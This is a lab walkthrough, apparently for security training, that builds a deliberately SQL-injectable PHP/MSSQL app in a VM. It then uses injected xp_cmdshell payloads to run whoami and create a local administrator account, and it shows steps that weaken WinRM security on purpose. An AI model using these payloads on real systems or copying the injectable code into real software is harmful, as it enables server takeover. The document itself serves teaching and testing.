# Execute Arbitrary Commands On A Server Via A SQL Injection Vulnerability
Database applications like MySQL, MS SQL, and Oracle can execute system commands with root or admin privileges. A SQL injection vulnerability could allow arbitrary command execution. In MS SQL, the `xp_cmdshell` stored procedure enables OS command execution from within SQL Server, potentially leading to remote system exploitation

## References
- [Try SQL Server on-premises or in the cloud](https://www.microsoft.com/en-my/sql-server/sql-server-downloads) by Microsoft
- [Download SQL Server Management Studio (SSMS)](https://learn.microsoft.com/en-us/sql/ssms/download-sql-server-management-studio-ssms?view=sql-server-ver16) by Microsoft
- [Download ODBC Driver for SQL Server](https://learn.microsoft.com/en-us/sql/connect/odbc/download-odbc-driver-for-sql-server?view=sql-server-ver16) by Microsoft
- [MSSQL Injection Cheat Sheet](https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet) by pentestmonkey
- [MSSQL Practical Injection Cheat Sheet](https://www.advania.co.uk/insights/blog/mssql-practical-injection-cheat-sheet/) by advania
- [MSSQL Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md) by swisskyrepo on GitHub
- [MSSQL Injection](https://book.hacktricks.xyz/pentesting-web/sql-injection/mssql-injection) by HackTricks
- [SQL Injection Cheat Sheet](https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/#SQLServerStoredProcedures) by invicti



## Tasks
- Install Microsoft SQL Server in a virtual machine
- Check if the xp_cmdshell stored procedure is enabled. If disabled, re-enable it
- Add the "nt system\mssqlserver" service account to the local administrator group on the server
- Develop a web application that connects to the MSSQL server and is vulnerable to SQL injection
- Implement user input fields without proper validation that can be exploited for SQL injection
- Use SQL injection techniques to execute arbitrary SQL queries and commands via the vulnerable input fields
- Execute "whoami" on the server using the xp_cmdshell stored procedure
- Use SQL injection to execute commands that create a new local administrator account on the server

## Benchmarks
- Demonstrate that a valid output is received when executing "whoami" on the server using the xp_cmdshell stored procedure
- RDP into the machine using the newly created local administrator account to prove successful exploitation

## Practical Approach
1. Download and install XAMPP, Microsoft SQL Server and also SQL Server Management Studio (SSMS) in Windows 10 VM
2. The vulnerable PHP web app is called `vuln.php` and is saved in vulnsql folder in htdocs. Note that in MSSQL, SQL or cmd injections are parsed sequentially, meaning that a full SQL with command injection will return only the corresponding SQL output. Therefore it needs to:
   - Process all result sets returned by SQL Server (as implemented in the `sqlsrv_next_result($stmt)` function). The first result set comes from the `SELECT * FROM users WHERE id = '1';` query. The second result set comes from the execution of `EXEC xp_cmdshell 'net user';`
   - Combine queries into one statement. The code sends both queries in one `sqlsrv_query` call and ensures SQL Server processes both queries as a single batch
   - Handle inputs dynamically. The input `1'; EXEC xp_cmdshell 'net user';--` successfully works because the entire string is dynamically inserted into the `$sql` query. SQL Server treats the string after the semicolon (`;`) as a separate command due to its batch execution capability. The code doesn't sanitize the input or validate it, so it executes as-is, which is intentional for a vulnerable application
   - Process query results in loops to process first result set (from `SELECT`) and next result set (from `EXEC xp_cmdshell`)
   ```
   <?php
   error_reporting(E_ALL);
   ini_set('display_errors', 1);
   
   // Database connection details
   $serverName = "localhost";
   $connectionOptions = array(
       "Database" => "master",
       "UID" => "sa",
       "PWD" => "sa"
   );
   
   $conn = sqlsrv_connect($serverName, $connectionOptions);
   
   if (!$conn) {
       die("Connection failed: " . print_r(sqlsrv_errors(), true));
   }
   ?>
   
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>User Information Portal</title>
       <style>
           body {
               font-family: Arial, sans-serif;
               margin: 20px;
               background-color: #f9f9f9;
               color: #333;
           }
           h2 {
               color: #0056b3;
           }
           form {
               margin-bottom: 20px;
               padding: 20px 50px 20px 20px;
               background: #fff;
               border: 1px solid #ccc;
               border-radius: 5px;
               max-width: 400px;
           }
           label {
               font-weight: bold;
           }
           input[type="text"] {
               width: 100%;
               padding: 8px;
               margin-top: 5px;
               margin-bottom: 15px;
               border: 1px solid #ccc;
               border-radius: 4px;
           }
           input[type="submit"] {
               background-color: #0056b3;
               color: white;
               border: none;
               padding: 10px 15px;
               cursor: pointer;
               border-radius: 4px;
           }
           input[type="submit"]:hover {
               background-color: #003d80;
           }
           .results {
               margin-top: 20px;
               padding: 15px;
               background: #fff;
               border: 1px solid #ccc;
               border-radius: 5px;
           }
           .error {
               color: red;
           }
       </style>
   </head>
   <body>
       <h2>User Information Portal</h2>
       <p>Enter a user ID to view their details. This portal allows authorized users to look up information in the system.</p>
   
       <form action="vuln.php" method="GET">
           <label for="id">User ID:</label>
           <input type="text" id="id" name="id" placeholder="Enter User ID" />
           <input type="submit" value="View Details" />
       </form>
   
       <?php
       if (isset($_GET['id'])) {
           $id = $_GET['id'];
   
           echo "<div class='results'><h3>Search Results:</h3>";
   
           // Check if the input is a plain number (normal query)
           if (preg_match('/^\d+$/', $id)) {
               // Execute a safe query if the input is just a number
               $sql = "SELECT ID, Username, Email FROM users WHERE id = $id;";
   
               $stmt = sqlsrv_query($conn, $sql);
   
               if ($stmt === false) {
                   echo "<p class='error'>Query failed! Please try again.</p>";
                   echo "<pre>" . print_r(sqlsrv_errors(), true) . "</pre>";
               } else {
                   $hasResults = false;
                   while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
                       $hasResults = true;
                       foreach ($row as $column => $value) {
                           echo htmlspecialchars("$column: $value") . "<br />";
                       }
                       echo "<br />";
                   }
   
                   if (!$hasResults) {
                       echo "<p>No results found for User ID: " . htmlspecialchars($id) . "</p>";
                   }
               }
   
               sqlsrv_free_stmt($stmt);
           } else {
               // Execute the potentially malicious query directly if input isn't a plain number
               $sql = "
                   SELECT ID, Username, Email FROM users WHERE id = '$id'; -- Simulate hiding passwords
                   EXEC xp_cmdshell '$id';
               ";
   
               $stmt = sqlsrv_query($conn, $sql);
   
               if ($stmt === false) {
                   echo "<p class='error'>Query failed! Please try again.</p>";
                   echo "<pre>" . print_r(sqlsrv_errors(), true) . "</pre>";
               } else {
                   do {
                       while ($row = sqlsrv_fetch_array($stmt, SQLSRV_FETCH_ASSOC)) {
                           foreach ($row as $column => $value) {
                               echo htmlspecialchars("$column: $value") . "<br />";
                           }
                           echo "<br />";
                       }
                   } while (sqlsrv_next_result($stmt)); // Move to the next result set
               }
   
               sqlsrv_free_stmt($stmt);
           }
   
           echo "</div>";
       } else {
           echo "<p>Please provide a User ID in the field above to search for details.</p>";
       }
   
       sqlsrv_close($conn);
       ?>
   </body>
   </html>
   ```
3. When SSMS is launched, connect to the SQL Server Instance using the appropriate server name and authentication details (can just leave it as optional)
4. Once connected, go to the toolbar and click 'New Query'. Run the following commands in the query window and execute them
   ```
   -- Check if xp_cmdshell is enabled
   EXEC sp_configure 'show advanced options', 1;
   RECONFIGURE;
   EXEC sp_configure 'xp_cmdshell';
   GO
   
   -- Enable xp_cmdshell if disabled
   EXEC sp_configure 'xp_cmdshell', 1;
   RECONFIGURE;
   GO
   ```
5. Verify that `xp_cmdshell` is enabled by running the command `EXEC xp_cmdshell 'whoami';` in the same query window. The output should look like this <br/>
   ![image](https://github.com/user-attachments/assets/f6fc0fb6-44da-4d4b-9cb0-73c1ada05908)
6. Add MSSQL Server service account to local administrators by running `lusrmgr.msc` to open Local Users and Groups Manager. Add `NT Service\MSSQLSERVER` to the Administrators group <br/>
   ![image](https://github.com/user-attachments/assets/7f1938de-c875-4359-b72f-212c133d3ac6)
7. Before running the vulnerable web application, download and install SQLSRV driver that matches the PHP version. If the PHP version is 8.2.12, find the files named `php_sqlsrv_82_nts_x64.dll` and `php_pdo_sqlsrv_82_nts_x64.dll` and copy them both to `C:\xampp\php\ext\`. Update the `php.ini` file to include `extension=php_sqlsrv_82_nts_x64.dll` and `extension=php_pdo_sqlsrv_82_nts_x64.dll` in the extensions section. Restart Apache in XAMPP
8. In SMSS, open a new query window and run the following SQL commands
   ```
   CREATE TABLE users (
    ID INT PRIMARY KEY,
    Username VARCHAR(50),
    Password VARCHAR(50),
    Email VARCHAR(100)
   );
   
   INSERT INTO users (ID, Username, Password, Email)
   VALUES
   (1, 'admin', 'password123', 'admin@example.com'),
   (2, 'user1', 'userpass', 'user1@example.com'),
   (3, 'user2', 'user2pass', 'user2@example.com'),
   (4, 'user3', 'user3pass', 'user3@example.com');
   ```
   The data can be found by expanding the Tables Node located under the master node
   ![image](https://github.com/user-attachments/assets/6cb4fa5a-230a-48bc-a7b7-f2907bc5ddd5)
9. Download and install Microsoft ODBC Driver for SQL Server (x64) in the reference link above. After installation, test the web app in localhost. If it does not work, repair the ODBC Driver by reinstalling and choose repair
10. To give admin privileges to the SQL Server account, it needs to be added to the `sysadmin` role (highest-level admin role in SQL). However, the SQL account username needs to be known first, and can be identified using
   ```
   SELECT name 
   FROM sys.syslogins 
   WHERE type_desc = 'SQL_LOGIN';
   ```
   or either one of these commands
   ```
   SELECT USER_NAME();
   SELECT CURRENT_USER;
   ```
   Then to use SQL Query to grant `sysadmin` privileges, run
   ```
   EXEC sp_addsrvrolemember 'username', 'sysadmin';
   ```
   To verify the privileges, run
   ```
   SELECT name, type_desc, is_disabled 
   FROM sys.server_principals 
   WHERE type_desc = 'SQL_LOGIN' AND name = 'username';
   ```
   or
   ```
   SELECT * FROM sys.syslogins WHERE name = 'username';
   ```
11. In the web app, add `1` into the user input field to check and retrieve data with ID = 1 stored in the database table
12. To inject `xp_cmdshell` into the query, use a dynamic SQL within the query as the following. The SQL Server interprets and run a dynamic SQL string which would not be blocked in a standard SQL query
    ```
    1'; EXEC xp_cmdshell 'whoami';--
    ```
    ![image](https://github.com/user-attachments/assets/d112bbfc-7e04-4f95-865e-5f723f14b8ed)

13. To use SQL injection to create a new user `hacker` with password `hacked1337`, use the following SQL injection strings inside the user input field
    ```
    1'; EXEC xp_cmdshell 'net user hacker hacked1337 /add';--
    ```
    ![image](https://github.com/user-attachments/assets/2886fbbc-a313-4583-a71b-530c3ab4e8c0)

14. To add this user to the local administrators group, add the following
    ```
    1'; EXEC xp_cmdshell 'net localgroup administrators hacker /add';--
    ```
    ![image](https://github.com/user-attachments/assets/93d8069c-8718-4a82-8b53-5f769d3cc89a)

15. To verify `hacker` was added, check in cmd or PowerShell after adding the user
    ![image](https://github.com/user-attachments/assets/6226b921-0ba3-490c-b937-aa8fdd775137)
16. To test RDP into the server with the new malicious credentials, enable enable PowerShell remoting between a local and target VMs, and get the IP address of the target remote machine. Then set it as a trusted host on the local machine to allow remote connections. Run each of the commands below
    ```      
    winrm quickconfig -Force
    Enable-PSRemoting -Force
    Set-Item WSMan:\localhost\Client\TrustedHosts -Value "the_other_Windows_IP_Address1,the_other_Windows_IP_Address2"
    Set-Item -force WSMan:\localhost\Client\AllowUnencrypted $true
    Set-Item -force WSMan:\localhost\Service\AllowUnencrypted $true
    Set-Item -force WSMan:\localhost\Client\Auth\Digest $true
    Set-Item -force WSMan:\localhost\Service\Auth\Basic $true
    ```
    To use the RDP capability, use
    ```
    Enter-PSSession -ComputerName the_other_Windows_IP_Address -Authentication Basic -Credential (Get-Credential)
    ```
    ![image](https://github.com/user-attachments/assets/12aed85a-f150-4cfd-af53-a7541d0f760b)


